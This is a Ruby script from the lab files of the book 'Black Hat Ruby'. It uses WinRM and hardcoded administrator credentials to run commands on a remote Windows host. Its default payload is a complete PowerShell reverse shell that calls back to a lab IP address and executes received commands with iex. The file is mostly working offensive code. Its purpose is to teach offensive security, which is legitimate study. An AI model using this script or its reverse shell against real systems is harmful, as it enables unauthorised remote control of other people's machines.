#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   A script to run commands on a remote system using WinRM
# Requirements:
#   gem install winrm
# 
require 'winrm'

# if no command is given, a powershell reverset shell will be executed on the remote host
cmd = ARGV[0] || %q{$client = New-Object System.Net.Sockets.TCPClient('192.168.100.10',9911);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}

opts = { 
  endpoint: 'http://192.168.100.110:5985/wsman',    # HTTP port: 5985 | HTTPS port: 5986
  transport: :negotiate,
  user:     'administrator',
  password: 'Asd@123'
}
conn = WinRM::Connection.new(opts)
conn.shell(:powershell) do |shell|
  output = shell.run(cmd) do |stdout, stderr|
    puts stdout
    puts stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end


